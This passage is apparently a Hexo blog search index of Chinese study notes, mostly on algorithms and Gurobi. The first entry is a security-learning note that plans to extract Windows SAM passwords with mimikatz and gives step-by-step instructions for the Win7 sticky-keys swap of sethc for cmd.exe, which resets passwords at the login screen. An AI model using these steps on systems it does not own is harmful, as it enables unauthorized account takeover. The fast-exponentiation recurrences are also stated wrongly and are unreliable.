-<p>windows ，账号密码存储的位置 ：<code>C:\windows\system32\config\SAM</code> 如果通过一定办法拿到 SAM 文件，并暴力搜索可以获得账号密码。</p>
-<h3 id="插曲"><a href="#插曲" class="headerlink" title="插曲"></a>插曲</h3><p>0..0 本机尝试使用 mimikatz来读取SAM数据库，但win7虚拟机下无法下载 mimikatz，尝试使用 Vmware tools 但 win7 由于 认证问题无法安装，尝试办法 <a href="https://blog.csdn.net/teisite/article/details/117675403">解决VMware16在虚拟机Windows7下安装VMware tools问题</a> 未成功；尝试将搭建 win7 与 主机的 ftp 连接，传输 mimikatz 压缩包，待续…</p>
-<p>以上所需步骤：</p>
-<ol>
-<li>搭建主机与虚拟机（win7+）ftp连接；</li>
-<li>将 mimikatz 传输至虚拟机；</li>
-<li>使用 mimikatz 通过以下参考获取账户密码。</li>
-</ol>
-<p>参考：</p>
-<p><a href="https://blog.csdn.net/SHENNONGZHAIZHU/article/details/52435519">Windows中的SAM文件</a></p>
-<p><a href="https://blog.csdn.net/qq_41874930/article/details/108149449?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E5%88%B0%20SAM%20%E6%96%87%E4%BB%B6&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-108149449.142^v11^pc_search_result_control_group,157^v12^control&amp;spm=1018.2226.3001.4187">sam文件获取与解密</a></p>
-<p><a href="https://blog.csdn.net/xddtrue/article/details/116596500?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-116596500-blog-52435519.pc_relevant_antiscanv3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-116596500-blog-52435519.pc_relevant_antiscanv3&amp;utm_relevant_index=5">通过SAM文件获取windows7密码</a></p>
-<blockquote>
-<p>system 系统账户，权限至高无上</p>
-<p>local services 本地服务账户 普通权限</p>
-<p>network services 网络服务账户 普通权限</p>
-</blockquote>
-<p>关于用户的一些简单 dos 命令：(切换到管理员用户下CMD)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user</span><br><span class="line">net user 账户名 字符串   <span class="comment">#修改密码</span></span><br><span class="line">net user 账户名         <span class="comment">#查看账户信息</span></span><br><span class="line">net user 账户名 密码 /add  <span class="comment">#新建账户</span></span><br><span class="line">net user 账户名 /del  <span class="comment">#删除账户</span></span><br><span class="line">net user 账户名 /active:<span class="built_in">yes</span>/no  <span class="comment">#激活或禁用账户</span></span><br></pre></td></tr></table></figure>
-<h2 id="组"><a href="#组" class="headerlink" title="组"></a>组</h2><p>组的作用：简化权限赋予</p>
-<p>赋权限方式：</p>
-<p>1)用户 - 组-赋权限</p>
-<p>2)用户-赋权限</p>
-<p>内置组（系统自带组）</p>
-<p>内置组的权限已经被系统赋予</p>
-<blockquote>
-<p>administrators      #管理员组<br>guests             #来宾组<br>users              #普通用户组<br>network            #网络配置组<br>print              #打印机组<br>Remote Desktop     #远程桌面组</p>
-</blockquote>
-<p>简单的关于组的 dos 命令:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net localgroup     <span class="comment">#查看组</span></span><br><span class="line">net localgroup 组名    <span class="comment">#查看组</span></span><br><span class="line">net localgroup 组名 /add     <span class="comment">#创建组</span></span><br><span class="line">net localgroup 组名 用户名 /add   <span class="comment">#添加组成员	(成员需要存在，net user new_user /add)</span></span><br><span class="line">net localgroup 组名 用户名 /del   <span class="comment">#删除组成员</span></span><br><span class="line">net localgroup 组名 /del       <span class="comment">#删除组</span></span><br></pre></td></tr></table></figure>
-<p>@@</p>
-<p>服务器远程管理</p>
-<p>图形化远程管理</p>
-<p>运行 ：“mstsc”</p>
-<p>telnet（命令行）\</p>
-<p>查看本地上所有开放的端口 cmd “netstat -an”</p>
-<p>telnet：23</p>
-<p>远程桌面协议RDP：3389</p>
-<p>@@</p>
-<p>//没做呢//</p>
-<h2 id="5-次-shift-的-win7-小漏洞"><a href="#5-次-shift-的-win7-小漏洞" class="headerlink" title="5 次 shift 的 win7 小漏洞"></a>5 次 shift 的 win7 小漏洞</h2><p>基本思路：</p>
-<p>在 win 7 登录界面按 5 次 shift 可以会启动 sethc 程序，尝试将该程序换成 cmd.exe 就可以使用命令更改用户密码。</p>
-<p>步骤：</p>
-<blockquote>
-<ol>
-<li>win 7 断电</li>
-<li>启动时进入系统修复界面（如果没出现修复选项，启动时按 F8）</li>
-<li>修复是出现系统还原选择取消，出现“无法修复”的弹窗时，点击查看问题详情会出现一个内部声明（该声明在系统磁盘内，是一个进入系统修改文件的口子。</li>
-<li>点进文档，另存为会出现文件目录，找到 <code>c:\windows\system32</code>目录，将 sethc 程序改名，cmd 程序复制改成 sethc。</li>
-<li>重启系统，在输密码界面再次 5 次 shift，就会启动 cmd（管理员） 而非 sethc，通过命令修改用户密码</li>
-</ol>
-</blockquote>
-]]></content>
-      <categories>
-        <category>CS</category>
-      </categories>
-      <tags>
-        <tag>CS_OP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安学习_D.1_环境部署</title>
-    <url>/2022/05/25/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-1-%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>使用 Vmware 装上几个旧window系统的虚拟机 win-xp/2003/7/2008</p>
-<h2 id="winxp"><a href="#winxp" class="headerlink" title="winxp"></a>winxp</h2><p>我的配置：</p>
-<ol>
-<li>使用的 winxp_professional 镜像(来自 msdn.itellyou)，删掉了 打印机，声卡</li>
-<li>分配 40G 空间（20+20）</li>
-<li>关掉了防火墙和自动更新</li>
-<li>至此，拍摄快照并克隆虚拟机（链接）<ul>
-<li>链接克隆和完整克隆的区别：链接克隆创建一个主虚拟机的子链接， 与主虚拟机并存（占用空间小）；完整克隆复制出一个独立的虚拟机（占用和主虚拟机一样大的空间）</li>
-</ul>
-</li>
-</ol>
-<h2 id="win2003"><a href="#win2003" class="headerlink" title="win2003"></a>win2003</h2><p>同上</p>
-<h2 id="win7"><a href="#win7" class="headerlink" title="win7"></a>win7</h2><p>没设密码</p>
-<h2 id="win2008"><a href="#win2008" class="headerlink" title="win2008"></a>win2008</h2><p>同上</p>
-]]></content>
-      <categories>
-        <category>CS</category>
-      </categories>
-      <tags>
-        <tag>CS_OP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Gurobi-2-ex-diet</title>
-    <url>/2022/06/01/Gurobi/Gurobi-2-ex-diet/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Gurobi_Outline</title>
-    <url>/2022/05/30/Gurobi/Gurobi_Outline/</url>
-    <content><![CDATA[<h1 id="Gurobi-建模的基本流程"><a href="#Gurobi-建模的基本流程" class="headerlink" title="Gurobi 建模的基本流程"></a>Gurobi 建模的基本流程</h1><p>这样定义会使整个模型易读</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = gurobipy.Model(<span class="string">&quot;Model_Name&quot;</span>)	<span class="comment">#模型</span></span><br><span class="line"></span><br><span class="line">var = m.addVar(vtype = var_type,name=<span class="string">&quot;var_name&quot;</span>)	<span class="comment">#增加变量</span></span><br><span class="line"><span class="comment">#...More vars</span></span><br><span class="line"></span><br><span class="line">m.setObject(objective_expression,objective_sense)	<span class="comment">#目标函数</span></span><br><span class="line"></span><br><span class="line">m.addConstr(constraint,constraint_name)	<span class="comment">#约束条件</span></span><br><span class="line"><span class="comment">#...More constraints</span></span><br><span class="line"></span><br><span class="line">m.optimize()	<span class="comment">#优化模型</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://ossimg.yzitc.com/2022/05/30/930c4d13cf906.png"></p>
-]]></content>
-      <categories>
-        <category>MILP_Learning</category>
-      </categories>
-      <tags>
-        <tag>Gurobi</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Brian Kernighan Algorithm</title>
-    <url>/2022/05/25/Algorithm/Brian-Kernighan-Algorithm/</url>
-    <content><![CDATA[<h1 id="Brian-Kernighan-Algorithm"><a href="#Brian-Kernighan-Algorithm" class="headerlink" title="Brian Kernighan Algorithm"></a>Brian Kernighan Algorithm</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>通过一定的位运算取到二进制数据的相应位</p>
-<ol>
-<li><p>$n\&amp;(n-1)$ 将数据二进制最右的 1 变为 0 </p>
-<p>例如：$n = 11_{(10)} = 1011_{(2)}, n\&amp;(n-1) = 1011 \&amp; 1010 = 1010_{(2)} = 10_{(10)}$</p>
-</li>
-<li><p>$n\&amp;(~n+1)$ 提取数据二进制最后一个 1 到结尾的数据</p>
-<p>例如：$n = 14_{(10)} = 1110_{(2)}, n\&amp;(~n+1) = 1110 \&amp; 0001 + 00001 = 1110 \&amp; 0010 = 0010_{(2)} = 2_{(10)}$</p>
-</li>
-</ol>
-<p>可以测试一下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = random.randint(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(n,<span class="built_in">bin</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(n−1):&#x27;</span>,n&amp;(n-<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(n-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(~n+1):&#x27;</span>,n&amp;(~n+<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(~n+<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
-<h2 id="example："><a href="#example：" class="headerlink" title="example："></a>example：</h2><p><a href="https://leetcode.cn/problems/number-of-1-bits/">191. 位1的个数</a></p>
-]]></content>
-      <categories>
-        <category>Code_Algo</category>
-      </categories>
-      <tags>
-        <tag>Math,Binary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>凸包算法</title>
-    <url>/2022/05/25/Algorithm/%E5%87%B8%E5%8C%85%E7%AE%97%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="凸包算法"><a href="#凸包算法" class="headerlink" title="凸包算法"></a>凸包算法</h2><p># 待补充：Jarvis，Andrew </p>
-<p>感谢<a href="https://blog.csdn.net/KnightHONG/article/details/101860288">凸包算法详解(Graham扫描法)</a>，由<a href="https://leetcode-cn.com/problems/erect-the-fence/">leetcode 587. 安装栅栏</a> 而来。</p>
-<p>理解凸包算法之前需要理解以下几个概念：</p>
-<ol>
-<li>向量积</li>
-<li>Jarvis算法</li>
-<li>Graham扫描，及极角排序</li>
-<li>Andrew 算法</li>
-</ol>
-<h3 id="向量积"><a href="#向量积" class="headerlink" title="向量积"></a>向量积</h3><p>在高等数学中，向量的运算包括数量积和向量积：</p>
-<p>*数量积，又叫点乘，定义是</p>
-<script type="math/tex; mode=display">
-\vec{a}=[a_1,a_2,...,a_n]\;and\;\vec{b}=[b_1,b_2,...,b_n]\\
-\vec{a} \cdot \vec{b}=\sum_{i\in{(1,n)}}{a_ib_i}</script><p>理解为对应位相乘再相加，如果向量为布尔向量，则乘操作变为 $AND$ 加操作变为 $XOR$ 。</p>
-<p>也可以表示为：</p>
-<script type="math/tex; mode=display">
-\vec{a} \cdot \vec{b}=|\vec{a}||\vec{b}|\cos\theta</script><p>从矩阵的角度理解为 $\vec{a}\cdot\vec{b} = \vec{a}^T*\vec{b}$</p>
-<p>例如$\vec{a}=[1,2]^T,\vec{b}=[2,1]^T\;\;\rightarrow\;\;\vec{a}\cdot\vec{b} = 1<em>2+2</em>1=4$ 即点乘得到的是一个数</p>
-<p><strong>*向量积</strong>，又叫叉乘，定义为（二维表示）</p>
-<script type="math/tex; mode=display">
-{\displaystyle \mathbf {\vec{a}} \times \mathbf {\vec{b}} =\|\mathbf {\vec{a}} \|*\|\mathbf {\vec{b}} \|\sin(\theta )\ \mathbf {n} }</script><p>$|\mathbf {a} |\;and\;|\mathbf {b} |$表示向量的模长，$\sin(\theta )$ 是两个向量在其所定义的平面上的夹角，$n$ 为 $\mathbf {\vec{a}} \;and\; \mathbf {\vec{b}}$ 所构成平面上的单位向量，$n$ 的方向根据右手定则判断（从 $\vec{a}$ 到 $\vec{b}$ 弯转四指，大拇指所指方向即为叉乘所得向量方向）所有向量积得到的是一个垂直于由 $\mathbf {\vec{a}} \;and\; \mathbf {\vec{b}}$ 所构成平面的向量，与 $\mathbf {\vec{a}} \;and\; \mathbf {\vec{b}}$ 所构成平面的法向量平行，<strong>如果与法向量同向，则结果取正，否则结果取负</strong>。也可以理解为与法向量反向时，由 $\mathbf {\vec{a}} \times \mathbf {\vec{b}}$ 变成了 $\mathbf {\vec{b}} \times \mathbf {\vec{a}}$ ，所以 $\mathbf {\vec{a}} \times \mathbf {\vec{b}} = -\mathbf {\vec{b}} \times \mathbf {\vec{a}}$ 或者也可表示为取模的形式，得到一个数字而非向量：</p>
-<script type="math/tex; mode=display">
-{\displaystyle |\mathbf {\vec{a}} \times \mathbf {\vec{b}}| =\|\mathbf {\vec{a}} \|*\|\mathbf {\vec{b}} \|\sin(\theta )}=(a_1*b_2)-(a_2*b_1)</script><p><img src="https://img-blog.csdnimg.cn/20191002101207446.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tuaWdodEhPTkc=,size_16,color_FFFFFF,t_70" alt="img"></p>
-<h3 id="Graham"><a href="#Graham" class="headerlink" title="Graham"></a>Graham</h3><h4 id="极角排序"><a href="#极角排序" class="headerlink" title="极角排序"></a>极角排序</h4><p>我们知道，二维平面上一个向量可以由一个点来表示，如：</p>
-<center>
-    <img src="https://img-blog.csdnimg.cn/20191001210234595.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tuaWdodEhPTkc=,size_8,color_FFFFFF,t_70" alt="img" style="zoom:50%;" />
-</center>
-
-<p>其中用点表示为 $p1,p2,p3…$ 用向量表示为 $\mathop{p0p1}\limits ^{\rightarrow},\vec{p0p2}…$ （注意这里把 $p0$ 看作原点）</p>
-<p>要将以上的各个向量排序，当然不能仅依赖其坐标，那么很自然的考虑到其与坐标轴的夹角，这里以 x 轴正半轴为基准轴，将向量按照与其夹角由小到大排序，那么顺序就是 $\mathop{p0p1}\limits ^{\rightarrow},\vec{p0p2}…\vec{p0p8}$  </p>
-<p>做好极角排序的准备工作之后，就可以开始开始凸包算法的<strong>Graham扫描</strong>了。</p>
-<h4 id="Graham扫描"><a href="#Graham扫描" class="headerlink" title="Graham扫描"></a>Graham扫描</h4><p>所谓 Graham 扫描，即寻找最外层能够将所有点包含住的一条封闭线，例如：</p>
-<center>
-    <img src="https://img-blog.csdnimg.cn/20191001212355831.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tuaWdodEhPTkc=,size_16,color_FFFFFF,t_70" width="60%">
-</center>
-
-<p>开始扫描，是将原点 $p0$ 与排序后的第一个顶点  $p1$ 相连得到向量 $\vec{p0p1}$，然后再将  $p1$ 与排序得到的下一个顶点相连，得到 $\vec{p1p2}$，此时需要进行一次判断：</p>
-<ul>
-<li><p>新加入的点和其与前一个点构成的向量是否为向左偏转（相对于前一条向量）如果是，则该点可能是构成凸包的最外层顶点；</p>
-</li>
-<li><p>否则，即新加入的点和其与前一个点构成的向量向右偏转（相对于前一条向量），则前面加入的点可能由于新加入了该点而不在外层顶点，换成新加入的点为构成凸包的最外层顶点。</p>
-</li>
-</ul>
-<p>以上图举例：</p>
-<p>加入 $p0p1$ 为第一条向量（$p1$ 纳入最外层顶点集），加入 $p1p2$ 为第二条向量（$p2$ 纳入最外层顶点集），此时根据图形判断，相对于第一条向量为向左偏转，加入 $p2p3$ 为第三条向量，判断 $p2p3$ 相对于 $p1p2$ 为向右偏转，则删除点 $p2$ 而将 $p3$ 纳入最外层顶点集…以此类推</p>
-<p>那么如何用数学语言判断向量是向哪个方向偏转呢？——向量积，如下图，顶点记 $a=(0,0)$ ，两个向量顶点 $b=(2,3)\;and\;c=(1,5)\;or\;(5,3)$ ：</p>
-<p>左图 $\vec{ab(=(2,3))}\times\vec{ac(=(1,5))}=2<em>5-3</em>1=7&gt;0$ ，即向左偏；</p>
-<p>右图 $\vec{ab(=(2,3))}\times\vec{ac(=(5,3))}=2<em>3-3</em>5=-9&lt;0$，即向右偏；</p>
-<center>
-    <img src="https://uploadfiles.nowcoder.com/images/20220423/629760107_1650711275955/6FB53C51539B47559CF0D122A832CF63" width="50%"><img src="https://uploadfiles.nowcoder.com/images/20220423/629760107_1650711275950/FE88E01440218FA643954E80A16BEDBB" width="50%">
-</center>
-
-
-<p>很明显，通过上面对向量积的描述可以推断出当绿色向量相对于蓝色向量向左偏转时叉乘结果为正，向右则为负。</p>
-<p>经过对所有顶点的依照条件：</p>
-<ol>
-<li>将各个坐标依极角排序</li>
-<li>新加入点构成的向量较前一条向量向左偏转（叉乘为正）</li>
-<li>将满足条件的点留在凸包顶点集，不满足的剔除</li>
-</ol>
-<p>就得到了一系列顶点的凸包，此即为使用Graham扫描的凸包算法的基本思想。</p>
-<p>C语言代码：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="Jarvis"><a href="#Jarvis" class="headerlink" title="Jarvis"></a>Jarvis</h3><h3 id="Andrew"><a href="#Andrew" class="headerlink" title="Andrew"></a>Andrew</h3>]]></content>
-      <categories>
-        <category>Code_Algo</category>
-      </categories>
-      <tags>
-        <tag>Math</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>矩阵快速幂</title>
-    <url>/2022/05/25/Algorithm/%E7%9F%A9%E9%98%B5%E5%BF%AB%E9%80%9F%E5%B9%82/</url>
-    <content><![CDATA[<h1 id="矩阵快速幂"><a href="#矩阵快速幂" class="headerlink" title="矩阵快速幂"></a><strong>矩阵快速幂</strong></h1><h2 id="整数快速幂"><a href="#整数快速幂" class="headerlink" title="整数快速幂"></a>整数快速幂</h2><p>解释：计算模幂运算时，可用的规则有：</p>
-<script type="math/tex; mode=display">
-(a+b)\%m=(a\%m+b\%m)\%m\\
-(a*b)\%m=(a\%m*b\%m)\%m</script><p>求幂次时可用将幂次拆分，如 $a^{b}$，</p>
-<ul>
-<li>b 为奇数时， $a^{b} = a^{b-1}*a^b$</li>
-<li>b 为偶数时， $a^{b} = (a^2)^{b-1}$</li>
-</ul>
-<p>一般是在取模的情况下快速幂，否则会数据过大</p>
-<p>例：求 $a^{b}\  \% \ c$</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">b = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># a^b%c</span></span><br><span class="line">res = <span class="number">1</span>	<span class="comment">#初始为为单位元</span></span><br><span class="line"><span class="keyword">while</span> b&gt;<span class="number">0</span>:</span><br><span class="line">  <span class="keyword">if</span> b&amp;<span class="number">1</span>:</span><br><span class="line">    res = (res * a) % c</span><br><span class="line">  a = a*a</span><br><span class="line">  b &gt;&gt;= <span class="number">1</span> <span class="comment"># == b//2</span></span><br><span class="line">  <span class="comment">#print(a,b,res)</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
-<h2 id="矩阵快速幂-1"><a href="#矩阵快速幂-1" class="headerlink" title="矩阵快速幂"></a>矩阵快速幂</h2><p>矩阵快速幂和整数快速幂原理相同，要求矩阵是方阵，以求斐波那契数列为例：</p>
-<script type="math/tex; mode=display">
-\left[\begin{array}{ll}
-1 & 1 \\
-1 & 0
-\end{array}\right]\left[\begin{array}{c}
-F(n) \\
-F(n-1)
-\end{array}\right]=\left[\begin{array}{c}
-F(n)+F(n-1) \\
-F(n)
-\end{array}\right]=\left[\begin{array}{c}
-F(n+1) \\
-F(n)
-\end{array}\right]</script><p>因此：</p>
-<script type="math/tex; mode=display">
-\left[ \begin{matrix} F(n + 1)\\ F(n) \end{matrix} \right] = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right] ^n \left[ \begin{matrix} F(1)\\ F(0) \end{matrix} \right]</script><p>令：</p>
-<script type="math/tex; mode=display">
-M = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right]</script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">multiply_matrix</span>(<span class="params">a,b</span>):</span><br><span class="line">            <span class="comment">#a,b = matrix</span></span><br><span class="line">            <span class="comment">#return matrix</span></span><br><span class="line">            c=[[<span class="number">0</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">0</span>]]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">                    c[i][j] = (a[i][<span class="number">0</span>]*b[<span class="number">0</span>][j] + a[i][<span class="number">1</span>]*b[<span class="number">1</span>][j]) % <span class="number">1000000007</span></span><br><span class="line">                    <span class="built_in">print</span>(c)</span><br><span class="line">            <span class="keyword">return</span> c</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">pow_matrix</span>(<span class="params">a,n</span>):</span><br><span class="line">            <span class="comment">#初始化为单位阵，不会影响初始运算</span></span><br><span class="line">            res = [[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">1</span>]] </span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> n &amp; <span class="number">1</span>:</span><br><span class="line">                    res = multiply_matrix(res,a)</span><br><span class="line">                n &gt;&gt;= <span class="number">1</span>  <span class="comment">#右移一位相当于 ceil(n//2)</span></span><br><span class="line">                a = multiply_matrix(a,a)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        ans = pow_matrix([[<span class="number">1</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>]],n-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> ans[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Code_Algo</category>
-      </categories>
-      <tags>
-        <tag>Math</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何判断三点是否共线？</title>
-    <url>/2022/06/09/Algorithm/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%B8%89%E7%82%B9%E6%98%AF%E5%90%A6%E5%85%B1%E7%BA%BF%EF%BC%9F/</url>
-    <content><![CDATA[<h2 id="判断三点共线"><a href="#判断三点共线" class="headerlink" title="判断三点共线"></a>判断三点共线</h2><p>判断三点是否共线，有三种方法（其实实质上是两种）</p>
-<p>点 $(x_1,y_1),(x_2,y_2),(x_3,y_3)$ </p>
-<h3 id="1-计算斜率"><a href="#1-计算斜率" class="headerlink" title="1. 计算斜率"></a>1. 计算斜率</h3><p>明显，如果三点组成两条直线斜率相同，则共线：</p>
-<p>判断条件：</p>
-<script type="math/tex; mode=display">
-(y_2-y_1)/(x_2-x_1) \overset{?}{=} (y_3-y_1)/(x_3-x_1)</script><p>如果分母存在 0 ，就不能够计算了。所有可以把上式转换为乘法（也就是向量叉乘）</p>
-<h3 id="2-向量叉乘"><a href="#2-向量叉乘" class="headerlink" title="2. 向量叉乘"></a>2. 向量叉乘</h3><script type="math/tex; mode=display">
-|\overset{\rightarrow}{a}\times\overset{\rightarrow}{b}| = |\overset{\rightarrow}{a}|*|\overset{\rightarrow}{b}|*sin\theta=(y_3−y_1) * (x_2−x_1) − (y_2−y_1) * (x_3−x_1)</script><p>如果共线，结果为 0 </p>
-<h3 id="3-三角形面积"><a href="#3-三角形面积" class="headerlink" title="3. 三角形面积"></a>3. 三角形面积</h3><p>如果三点共线，面积自然为 0 </p>
-<script type="math/tex; mode=display">
-S=\frac{1}{2}\left|\begin{array}{lll}
-x 1 & y 1 & 1 \\
-x 2 & y 2 & 1 \\
-x 3 & y 3 & 1
-\end{array}\right|\\
-=(x_1*y_2 + x_2*y_3 + x_3*y_1 - x_1*y_3 - x_2*y_1 - x_3*y_2)</script><h3 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h3><h4 id="1037-Valid-Boomerang"><a href="#1037-Valid-Boomerang" class="headerlink" title="1037. Valid Boomerang"></a><a href="https://leetcode.cn/problems/valid-boomerang/">1037. Valid Boomerang</a></h4><p>Given an array <code>points</code> where <code>points[i] = [xi, yi]</code> represents a point on the <strong>X-Y</strong> plane, return <code>true</code> <em>if these points are a <strong>boomerang</strong></em>.</p>
-<p>A <strong>boomerang</strong> is a set of three points that are <strong>all distinct</strong> and <strong>not in a straight line</strong>.</p>
-<p><strong>Example 1:</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: points = [[1,1],[2,3],[3,2]]</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
-<p><strong>Example 2:</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Input: points = [[1,1],[2,2],[3,3]]</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
-<p><strong>Constraints:</strong></p>
-<ul>
-<li><code>points.length == 3</code></li>
-<li><code>points[i].length == 2</code></li>
-<li><code>0 &lt;= xi, yi &lt;= 100</code></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isBoomerang</span>(<span class="params">self, points: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">#斜率，但不能保证没有 0 </span></span><br><span class="line">        <span class="comment">#return (points[1][1]-points[0][1])/(points[1][0]-points[0][0]) != (points[2][1]-points[0][1])/(points[2][0]-points[0][0])</span></span><br><span class="line">        <span class="comment">#转换为 乘法求</span></span><br><span class="line">        <span class="keyword">return</span> (points[<span class="number">1</span>][<span class="number">0</span>]-points[<span class="number">0</span>][<span class="number">0</span>])*(points[<span class="number">2</span>][<span class="number">1</span>]-points[<span class="number">0</span>][<span class="number">1</span>]) != (points[<span class="number">1</span>][<span class="number">1</span>]-points[<span class="number">0</span>][<span class="number">1</span>])*(points[<span class="number">2</span>][<span class="number">0</span>]-points[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">        <span class="comment">#三角形面积(如果三角形面积不为 0 则满足题意)</span></span><br><span class="line">        <span class="comment">#(x1*y2 + x2*y3 + x3*y1 - x1*y3 - x2*y1 - x3*y2)</span></span><br><span class="line">        <span class="comment">#return points[0][0]*points[1][1] + points[1][0]*points[2][1] + points[2][0]*points[0][1] - points[0][0]*points[2][1] - points[1][0]*points[0][1] - points[2][0]*points[1][1] != 0</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Code_Algo</category>
-      </categories>
-      <tags>
-        <tag>Math,Binary</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>素数筛</title>
-    <url>/2022/05/25/Algorithm/%E7%B4%A0%E6%95%B0%E7%AD%9B/</url>
-    <content><![CDATA[<h1 id="素数筛"><a href="#素数筛" class="headerlink" title="素数筛"></a>素数筛</h1><h2 id="艾氏筛"><a href="#艾氏筛" class="headerlink" title="艾氏筛"></a>艾氏筛</h2><p>筛出小于 n 的所有素数</p>
-<ol>
-<li>建立数组记录每个值是否为素数，初始化全是素数；</li>
-<li>遍历数组（<strong>遍历到 sqrt(n) 就够了</strong>），将当前值 i 的倍数全部划为合数类；</li>
-<li>得到一个划分和素数与合数的数组</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">countPrimes</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        isPrime = [<span class="number">1</span>] * n</span><br><span class="line">        isPrime[<span class="number">0</span>] = isPrime[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">int</span>(n ** <span class="number">0.5</span>) + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> isPrime[i]:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i*i,n,i):</span><br><span class="line">                    isPrime[j] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span 